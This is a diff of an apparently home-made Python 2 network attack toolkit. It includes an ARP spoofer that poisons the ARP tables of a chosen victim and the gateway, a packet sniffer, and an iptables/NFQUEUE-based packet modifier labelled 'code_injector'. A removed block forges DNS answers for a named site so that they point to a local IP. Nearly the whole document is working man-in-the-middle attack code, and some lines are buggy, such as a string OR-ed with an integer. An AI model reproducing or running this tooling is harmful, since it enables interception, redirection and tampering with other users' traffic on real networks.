@@ -147,146 +147,48 @@ def restore_arp_tables(dst_ip_list, src_ip_list):
 
 # THE MAIN FUNCTION TO SPOOF ARP-TABLES <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def arp_spoofer():
-    spoof_cmd = raw_input("In you want to spoof just one arp-table - write 'one': ")
+    spoof_cmd = raw_input("Do you want to get an arp-spoof for all hosts? (y/n or whatever you want to exit): ")
+    interval_in_seconds = raw_input("Set prefer interval for arping in seconds (by default: 2): ") | 2
     presettings()
     gateway_ip = get_gateway_ip()
     try:
-        if "one" == spoof_cmd:
-            print_host_list(network_scanner())
+        if "n" == spoof_cmd:
+            print_host_list(network_scanner(False))
             target_ip = raw_input("Choose an 'IP' showed above: ")
-
-            print("Packets sent\tSeconds passed\n------------------------------")
             start = time.time()
             while True:
                 spoof_arp_tables(target_ip, gateway_ip)
                 spoof_arp_tables(gateway_ip, target_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
-                time.sleep(2)
+                time.sleep(interval_in_seconds)
 
-        else:
+        elif "y" == spoof_cmd:
             target_ip = network_scanner(True)
-            print("Packets sent\tSeconds passed\n------------------------------")
             start = time.time()
             while True:
                 spoof_arp_tables(target_ip, gateway_ip)
                 spoof_arp_tables(gateway_ip, target_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
-                time.sleep(2)
-    except KeyboardInterrupt:
-        print("\nDetecting 'CTRL+C'... Resetting ARP-tables... Please wait...")
-        restore_arp_tables(target_ip, gateway_ip)
-        restore_arp_tables(gateway_ip, target_ip)
-        print("ARP-tables were resetting successfully!")
-    except BaseException:
-        print("WARNING! Something get wrong!")
+                time.sleep(interval_in_seconds)
+        else:
+            sys.exit()
+    except (KeyboardInterrupt, BaseException), e:
+        print("WARNING! Something get wrong!... Resetting ARP-tables... Please wait...")
         restore_arp_tables(target_ip, gateway_ip)
         restore_arp_tables(gateway_ip, target_ip)
         print("ARP-tables were resetting successfully!")
 # ================================= /For arp_spoofing ========================================
 # ================================= For traffic_sniffer ========================================
 def sniffer_callback(packet):
-    print(packet.show())
-
-def sniff(nic):
-    scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
+    print(packet.show())  # think, what to present/search
 
 def traffic_sniffer():
-    #>>>>YOU NEED TO PUT HERE ARP SPOOFER WITH CONDITION<<<<<<<<<<<<<
-    nic = raw_input("Write your NIC (examples: 'eth0', 'wlan0'): ")
-    sniff(nic)
+    nic = raw_input("What NIC would you prefer to sniff on? (examples: 'eth0', 'wlan0'): ")
+    scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
 # ================================= /For traffic_sniffer ========================================
-
-# def get_args():
-#     parser = argparse.ArgumentParser()
-#     parser.add_argument("-c", dest="mac_changer", help="Flag to change the MAC-address (example: -c 1)")
-#     parser.add_argument("-cs", dest="network_scanner", help="Flag to scan the connected network (example: -cs 1)")
-#     parser.add_argument("-css", dest="arp_spoofer", help="Flag to spoof the VICTIM and the GATEWAY every 2 sec in infinite loop (example: -css 1)")
-#     parser.add_argument("-csss", dest="traffic_sniffer", help="Flag to sniff the VICTIM traffic (example: -csss 1)")
-#     command = parser.parse_args()
-#     if not command:
-#         parser.error("Please, specify one of the following flags --> |-c|-cs|-css|-csss|, use --help for more info")
-#         if not (command.mac_changer | command.network_scanner | command.arp_spoofer | command.traffic_sniffer):
-#             parser.error("WARNING! Incorrect flag, use --help for more info")
-#     return command
-
-def cmd_switch():
-    cmd = raw_input(
-        "Choose one of:\n>>> 'm' - mac_changer <<<\n>>> 'n' - network_scanner <<<\n>>> 'a' - arp_spoofer <<<\n>>> 't' - traffic_sniffer <<<\n>>> 'e' - exit <<<\n>>> Write here: ")
-    if "m" == cmd:
-        mac_changer()  # independent
-    elif "n" == cmd:
-        print_host_list(network_scanner())  # independent
-    elif "a" == cmd:
-        arp_spoofer()  # independent
-    elif "t" == cmd:
-        traffic_sniffer()  # independent
-    elif "e" == cmd:
-        sys.exit()
-    return cmd
-
-def JUSTDOIT():
-    cmd = cmd_switch()
-    while cmd not in ["m", "n", "a", "t"]:
-        cmd = cmd_switch()
-
-JUSTDOIT()
-
-### dns_spoof ###
-def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
-    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
-    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
-    options = parser.parse_args()
-    if not options.chain_name0:
-        parser.error("Please, specify a chain name, use --help for more info")
-    elif not options.queue_num:
-        parser.error("Please, specify a queue number, use --help for more info")
-    else:
-        if ("OUTPUT" or "INPUT") == options.chain_name0:
-            if not options.chain_name1:
-                parser.error("Please, specify a chain name, use --help for more info")
-    return options
-
-def presets_for_intercept_and_modify_packets(options):
-    if options.chain_name1:
-        subprocess.call(["iptables", "-A", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
-    subprocess.call(["iptables", "-A", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])
-
-def flush_presets():
-    subprocess.call("iptables --flush", shell=True)
-
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname
-        if "seasonvar.ru" in qname:
-            print("Spoofing: " + qname)
-            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].len
-            del scapy_packet[scapy.UDP].chksum
-
-            packet.set_payload(str(scapy_packet))
-    packet.accept()
-
-options = get_args()
-presets_for_intercept_and_modify_packets(options)
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(int(options.queue_num), process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
-    flush_presets()
-    print("IP-tables were flushing successfully!")
-### /dns_spoof ###
-
+# ================================= /For code_injector ========================================
 http_ports = [80, 8080, 8008, 8000]
 
 def get_args():
@@ -346,17 +248,52 @@ def process_packet(packet):
             packet.set_payload(str(new_packet))
     packet.accept()
 
-options = get_args()
-presets_for_intercept_and_modify_packets(options)
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(int(options.queue_num), process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
-    flush_presets()
-    print("IP-tables were flushing successfully!")
-except BaseException:
-    print("WARNING! Something get wrong!")
-    flush_presets()
-    print("IP-tables were flushing successfully!")
+def code_injector():
+    options = get_args()
+    presets_for_intercept_and_modify_packets(options)
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(int(options.queue_num), process_packet)
+        queue.run()
+    except (KeyboardInterrupt, BaseException), e:
+        print("WARNING! Something get wrong!... Flushing IP-tables... Please wait...")
+        flush_presets()
+        print("IP-tables were flushing successfully!")
+# ================================= /For code_injector ========================================
+
+# def get_args():
+#     parser = argparse.ArgumentParser()
+#     parser.add_argument("-c", dest="mac_changer", help="Flag to change the MAC-address (example: -c 1)")
+#     parser.add_argument("-cs", dest="network_scanner", help="Flag to scan the connected network (example: -cs 1)")
+#     parser.add_argument("-css", dest="arp_spoofer", help="Flag to spoof the VICTIM and the GATEWAY every 2 sec in infinite loop (example: -css 1)")
+#     parser.add_argument("-csss", dest="traffic_sniffer", help="Flag to sniff the VICTIM traffic (example: -csss 1)")
+#     command = parser.parse_args()
+#     if not command:
+#         parser.error("Please, specify one of the following flags --> |-c|-cs|-css|-csss|, use --help for more info")
+#         if not (command.mac_changer | command.network_scanner | command.arp_spoofer | command.traffic_sniffer):
+#             parser.error("WARNING! Incorrect flag, use --help for more info")
+#     return command
+
+def cmd_switch():
+    cmd = raw_input(
+        "Choose one of:\n>>> 'm' - mac_changer <<<\n>>> 'n' - network_scanner <<<\n>>> 'a' - arp_spoofer <<<\n>>> 't' - traffic_sniffer <<<\n>>> 'c' - code_injector <<<\n>>> 'e' - exit <<<\n>>> Write here: ")
+    if "m" == cmd:
+        mac_changer()  # independent
+    elif "n" == cmd:
+        print_host_list(network_scanner(False))  # independent
+    elif "a" == cmd:
+        arp_spoofer()  # independent # needs to be a demon
+    elif "t" == cmd:
+        traffic_sniffer()  # independent
+    elif "c" == cmd:
+        code_injector()  # independent
+    elif "e" == cmd:
+        sys.exit()
+    return cmd
+
+def JUSTDOIT():
+    cmd = cmd_switch()
+    while cmd not in ["m", "n", "a", "t", "c"]:
+        cmd = cmd_switch()
+
+JUSTDOIT()
